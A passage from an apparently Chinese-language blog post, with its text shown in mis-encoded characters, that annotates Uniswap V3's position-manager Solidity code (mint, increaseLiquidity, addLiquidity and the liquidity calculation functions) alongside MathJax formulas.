ã€‚è¿™ä¸¤ä¸ªå‡½æ•°çš„é€»è¾‘åŸºæœ¬ä¸€è‡´ï¼Œéƒ½æ˜¯é€šè¿‡è°ƒç”¨<code>addLiquidity</code>å‡½æ•°å®ç°ã€‚mintéœ€è¦é¢å¤–åˆ›å»ºERC721çš„tokenã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs solidity">    /// @inheritdoc INonfungiblePositionManager<br>    //mintå‡½æ•°å®ç°åˆå§‹çš„æµåŠ¨æ€§çš„æ·»åŠ <br>    function mint(MintParams calldata params)<br>        external<br>        payable<br>        override<br>        checkDeadline(params.deadline) //modifierï¼Œç¡®ä¿_blockTimestamp() &lt;= deadline<br>        returns (<br>            uint256 tokenId,<br>            uint128 liquidity,<br>            uint256 amount0,<br>            uint256 amount1<br>        )<br>    {<br>        IUniswapV3Pool pool;<br>        //æ·»åŠ æµåŠ¨æ€§ï¼Œå¹¶å®Œæˆtoken0å’Œtoken1çš„å‘é€<br>        //æ ¸å¿ƒï¼Œåœ¨ä¸‹é¢è¿›è¡Œè§£é‡Š<br>        (liquidity, amount0, amount1, pool) = addLiquidity(<br>            AddLiquidityParams({<br>                token0: params.token0,<br>                token1: params.token1,<br>                fee: params.fee,<br>                recipient: address(this),<br>                tickLower: params.tickLower,<br>                tickUpper: params.tickUpper,<br>                amount0Desired: params.amount0Desired,<br>                amount1Desired: params.amount1Desired,<br>                amount0Min: params.amount0Min,<br>                amount1Min: params.amount1Min<br>            })<br>        );<br><br>        //é“¸é€  ERC721 token ç»™ç”¨æˆ·ï¼Œç”¨æ¥ä»£è¡¨ç”¨æˆ·æ‰€æŒæœ‰çš„æµåŠ¨æ€§<br>        _mint(params.recipient, (tokenId = _nextId++));<br><br>//ç”±åˆ›å»ºåœ°å€å’Œè¾¹ç•Œreturn keccak256(abi.encodePacked(owner, tickLower, tickUpper))<br>        bytes32 positionKey = PositionKey.compute(address(this), params.tickLower, params.tickUpper);<br>        // feeGrowthGlobal0X128 å’Œ feeGrowthGlobal1X128 ï¼Œåˆ†åˆ«è¡¨ç¤ºæ­¤ position å†…çš„ token0 å’Œ token1 æ‰€ç´¯è®¡çš„æ‰‹ç»­è´¹æ€»é¢ã€‚å®ƒåªä¼šåœ¨ position å‘ç”Ÿå˜åŠ¨ï¼Œæˆ–è€…ç”¨æˆ·æå–æ‰‹ç»­è´¹æ—¶æ›´æ–°<br>        //pool.positionsæ˜¯ä¸€ä¸ªmappingï¼Œmapping(bytes32 =&gt; Position.Info) public override positions<br>        //Position.Infoæ˜¯ä¸€ä¸ªstructï¼Œåœ¨Position.solä¸­<br>        (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) = pool.positions(positionKey);<br><br>        // idempotent set<br>        uint80 poolId =<br>            cachePoolKey(<br>                address(pool),<br>                PoolAddress.PoolKey({token0: params.token0, token1: params.token1, fee: params.fee})<br>            );<br><br>//æ›´æ–°mapping _positionsï¼Œç”¨ ERC721 çš„ token ID ä½œä¸ºé”®ï¼Œå°†ç”¨æˆ·æä¾›æµåŠ¨æ€§çš„å…ƒä¿¡æ¯ä¿å­˜èµ·æ¥<br>        _positions[tokenId] = Position({<br>            nonce: 0,<br>            operator: address(0),<br>            poolId: poolId,<br>            tickLower: params.tickLower,<br>            tickUpper: params.tickUpper,<br>            liquidity: liquidity,<br>            feeGrowthInside0LastX128: feeGrowthInside0LastX128,<br>            feeGrowthInside1LastX128: feeGrowthInside1LastX128,<br>            tokensOwed0: 0,<br>            tokensOwed1: 0<br>        });<br><br>        emit IncreaseLiquidity(tokenId, liquidity, amount0, amount1);<br>    }<br><br>...<br><br>//increaseLiquidityå‡½æ•°å®ç°äº†æµåŠ¨æ€§çš„å¢åŠ ï¼Œä¸ä¸Šé¢çš„mintç±»ä¼¼<br>    function increaseLiquidity(IncreaseLiquidityParams calldata params)<br>        external<br>        payable<br>        override<br>        checkDeadline(params.deadline)<br>        returns (<br>            uint128 liquidity,<br>            uint256 amount0,<br>            uint256 amount1<br>        )<br>    {<br>        Position storage position = _positions[params.tokenId];<br><br>        PoolAddress.PoolKey memory poolKey = _poolIdToPoolKey[position.poolId];<br><br>        IUniswapV3Pool pool;<br>        //æ ¸å¿ƒ<br>        (liquidity, amount0, amount1, pool) = addLiquidity(<br>            AddLiquidityParams({<br>                token0: poolKey.token0,<br>                token1: poolKey.token1,<br>                fee: poolKey.fee,<br>                tickLower: position.tickLower,<br>                tickUpper: position.tickUpper,<br>                amount0Desired: params.amount0Desired,<br>                amount1Desired: params.amount1Desired,<br>                amount0Min: params.amount0Min,<br>                amount1Min: params.amount1Min,<br>                recipient: address(this)<br>            })<br>        );<br><br>        bytes32 positionKey = PositionKey.compute(address(this), position.tickLower, position.tickUpper);<br><br>        // this is now updated to the current transaction<br>        (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) = pool.positions(positionKey);<br><br>        position.tokensOwed0 += uint128(<br>        //è®¡ç®—aÃ—bÃ·denominator<br>            FullMath.mulDiv(<br>                feeGrowthInside0LastX128 - position.feeGrowthInside0LastX128, //a<br>                position.liquidity, //b<br>                FixedPoint128.Q128 //denominatorï¼Œè¿™é‡Œç­‰äº0x100000000000000000000000000000000<br>            )<br>        );<br>        position.tokensOwed1 += uint128(<br>            FullMath.mulDiv(<br>                feeGrowthInside1LastX128 - position.feeGrowthInside1LastX128,<br>                position.liquidity,<br>                FixedPoint128.Q128<br>            )<br>        );<br><br>        position.feeGrowthInside0LastX128 = feeGrowthInside0LastX128;<br>        position.feeGrowthInside1LastX128 = feeGrowthInside1LastX128;<br>        position.liquidity += liquidity;<br><br>        emit IncreaseLiquidity(params.tokenId, liquidity, amount0, amount1);<br>    }<br><br></code></pre></td></tr></table></figure><h2 id="addLiquidity"><a href="#addLiquidity" class="headerlink" title="addLiquidity"></a>addLiquidity</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs solidity">  struct AddLiquidityParams {<br>      address token0; //token0çš„åœ°å€<br>      address token1; //token1çš„åœ°å€<br>      uint24 fee; //äº¤æ˜“è´¹ç‡<br>      address recipient; //æµåŠ¨æ€§æ‰€å±äººåœ°å€<br>      int24 tickLower; //æµåŠ¨æ€§ä»·æ ¼ä¸‹é™ï¼ˆä»¥token0è®¡ä»·ï¼‰ï¼Œè¿™é‡Œä¼ å…¥çš„æ˜¯ tick index<br>      int24 tickUpper; //æµåŠ¨æ€§ä»·æ ¼ä¸Šé™ï¼ˆä»¥token0è®¡ä»·ï¼‰ï¼Œè¿™é‡Œä¼ å…¥çš„æ˜¯ tick index<br>      uint256 amount0Desired; //<br>      uint256 amount1Desired;<br>      uint256 amount0Min; //æä¾›çš„token0ä¸‹é™æ•°<br>      uint256 amount1Min; //æä¾›çš„token1ä¸‹é™æ•°<br>  }<br><br>  /// @notice Add liquidity to an initialized pool<br>  function addLiquidity(AddLiquidityParams memory params)<br>      internal<br>      returns (<br>          uint128 liquidity,<br>          uint256 amount0,<br>          uint256 amount1,<br>          IUniswapV3Pool pool<br>      )<br>  {<br>  //æ£€ç´¢å¯¹åº”çš„æµåŠ¨æ€§æ± <br>      PoolAddress.PoolKey memory poolKey =<br>          PoolAddress.PoolKey({token0: params.token0, token1: params.token1, fee: params.fee});<br><br>//ä¸éœ€è¦è®¿é—®factoryå°±å¯ä»¥è®¡ç®—å‡ºpoolçš„åœ°å€ï¼ŒåŸç†åœ¨ä¸Šé¢çš„CREATE2éƒ¨åˆ†<br>      pool = IUniswapV3Pool(PoolAddress.computeAddress(factory, poolKey));<br><br>      // compute the liquidity amount<br>      //è®¡ç®—æµåŠ¨æ€§çš„å¤§å°ï¼Œè¯¦è§ä¸‹æ–‡<br>      {<br>          (uint160 sqrtPriceX96, , , , , , ) = pool.slot0();<br>          uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(params.tickLower);<br>          uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(params.tickUpper);<br><br>          liquidity = LiquidityAmounts.getLiquidityForAmounts(<br>              sqrtPriceX96, //æ„æ€æ˜¯ä»·æ ¼Pçš„å¹³æ–¹æ ¹, ç„¶åå·¦ç§»äº†96ä½ä¿å­˜ç²¾åº¦<br>              sqrtRatioAX96,<br>              sqrtRatioBX96,<br>              params.amount0Desired,<br>              params.amount1Desired<br>          );<br>      }<br><br>      (amount0, amount1) = pool.mint(<br>          params.recipient,<br>          params.tickLower,<br>          params.tickUpper,<br>          liquidity,<br>          //ç”¨äº pool åˆçº¦å›è°ƒ<br>          abi.encode(MintCallbackData({poolKey: poolKey, payer: msg.sender}))<br>      );<br><br>      require(amount0 &gt;= params.amount0Min &amp;&amp; amount1 &gt;= params.amount1Min, 'Price slippage check');<br>  }<br></code></pre></td></tr></table></figure><h3 id="getLiquidityForAmounts"><a href="#getLiquidityForAmounts" class="headerlink" title="getLiquidityForAmounts"></a>getLiquidityForAmounts</h3><p>ç”¨æ¥è®¡ç®—æµåŠ¨æ€§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">  /// @notice Computes the maximum amount of liquidity received for a given amount of token0, token1, the current<br>  /// pool prices and the prices at the tick boundaries<br>  /// @param sqrtRatioX96 A sqrt price representing the current pool prices<br>  /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary<br>  /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary<br>  /// @param amount0 The amount of token0 being sent in<br>  /// @param amount1 The amount of token1 being sent in<br>  /// @return liquidity The maximum amount of liquidity received<br>  function getLiquidityForAmounts(<br>      uint160 sqrtRatioX96,  //å½“å‰çŸ¿æ± ä»·æ ¼çš„å¹³æ–¹æ ¹<br>      uint160 sqrtRatioAX96, //ç¬¬ä¸€ä¸ªtickè¾¹ç•Œçš„ä»·æ ¼çš„å¹³æ–¹æ ¹<br>      uint160 sqrtRatioBX96, //ç¬¬äºŒä¸ªtickè¾¹ç•Œçš„ä»·æ ¼çš„å¹³æ–¹æ ¹<br>      uint256 amount0, //å‘é€çš„token0çš„æ•°é‡<br>      uint256 amount1 //å‘é€çš„token1çš„æ•°é‡<br>      //è¿”å›æ”¶åˆ°çš„æœ€å¤§æµåŠ¨æ€§é‡‘é¢<br>  ) internal pure returns (uint128 liquidity) {<br>  //æ’åºï¼Œä¿è¯sqrtRatioAX96&lt;sqrtRatioBX96<br>      if (sqrtRatioAX96 &gt; sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);<br>//æƒ…å†µ1<br>      if (sqrtRatioX96 &lt;= sqrtRatioAX96) {<br>          liquidity = getLiquidityForAmount0(sqrtRatioAX96, sqrtRatioBX96, amount0);<br>      //æƒ…å†µ2    <br>      } else if (sqrtRatioX96 &lt; sqrtRatioBX96) {<br>          uint128 liquidity0 = getLiquidityForAmount0(sqrtRatioX96, sqrtRatioBX96, amount0);<br>          uint128 liquidity1 = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioX96, amount1);<br><br>          liquidity = liquidity0 &lt; liquidity1 ? liquidity0 : liquidity1;<br>      //æƒ…å†µ3    <br>      } else {<br>          liquidity = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioBX96, amount1);<br>      }<br>  }<br><br></code></pre></td></tr></table></figure><p>æƒ…å†µ1ï¼šå½“å‰æ± ä¸­çš„ä»·æ ¼å°äºç­‰äºä»·æ ¼èŒƒå›´çš„æœ€å°å€¼</p><p><img src="/2022/08/20/uniswap-v3-2/image-20220819160147301.png" alt="image-20220819160147301"></p><p>æ­¤æ—¶æ·»åŠ çš„æµåŠ¨æ€§å…¨éƒ¨ä¸ºx token<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -3.307ex;" xmlns="http://www.w3.org/2000/svg" width="16.791ex" height="6.456ex" role="img" focusable="false" viewbox="0 -1392 7421.8 2853.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mo" transform="translate(958.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mfrac" transform="translate(2014.6,0)"><g data-mml-node="mrow" transform="translate(2001.1,676)"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g></g><g data-mml-node="mrow" transform="translate(220,-824.9)"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(771.9,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="msub" transform="translate(220,-525.2) scale(0.707)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,91.4)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="42.4" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g></g><rect width="1657.4" height="60" x="120" y="220"/></g><g data-mml-node="mo" transform="translate(2119.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mfrac" transform="translate(3119.8,0)"><g data-mml-node="mn" transform="translate(746.9,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="msub" transform="translate(220,-525.2) scale(0.707)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,91.4)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="42.4" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g></g><rect width="1607.4" height="60" x="120" y="220"/></g></g><rect width="5167.2" height="60" x="120" y="220"/></g></g></g></svg></mjx-container><br>ä»¥ä¸Šè¿‡ç¨‹è¡¨ç¤ºåœ¨getLiquidityForAmount0ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getLiquidityForAmount0(<br>    uint160 sqrtRatioAX96,<br>    uint160 sqrtRatioBX96,<br>    uint256 amount0<br>) internal pure returns (uint128 liquidity) {<br>//æ’åº<br>    if (sqrtRatioAX96 &gt; sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);<br>    //sqrtRatioAX96*sqrtRatioBX96/FixedPoint96.Q96<br>    uint256 intermediate = FullMath.mulDiv(sqrtRatioAX96, sqrtRatioBX96, FixedPoint96.Q96);<br>    return toUint128(FullMath.mulDiv(amount0, intermediate, sqrtRatioBX96 - sqrtRatioAX96));<br>}<br></code></pre></td></tr></table></figure><p>æƒ…å†µäºŒï¼šå½“å‰æ± ä¸­çš„ä»·æ ¼åœ¨ä»·æ ¼èŒƒå›´ä¸­</p><p><img src="/2022/08/20/uniswap-v3-2/image-20220819160225006.png" alt="image-20220819160225006"></p><p>æ­¤æ—¶æ·»åŠ çš„æµåŠ¨æ€§åŒ…å«ä¸¤ä¸ªå¸ç§ï¼Œå¯ä»¥é€šè¿‡ä»»æ„ä¸€ä¸ª token æ•°é‡è®¡ç®—å‡ºæµåŠ¨æ€§<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -3.307ex;" xmlns="http://www.w3.org/2000/svg" width="32.634ex" height="6.456ex" role="img" focusable="false" viewbox="0 -1392 14424 2853.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mo" transform="translate(958.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mfrac" transform="translate(2014.6,0)"><g data-mml-node="mrow" transform="translate(1977.1,676)"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g></g><g data-mml-node="mrow" transform="translate(220,-824.9)"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(747.9,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="msub" transform="translate(220,-525.2) scale(0.707)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 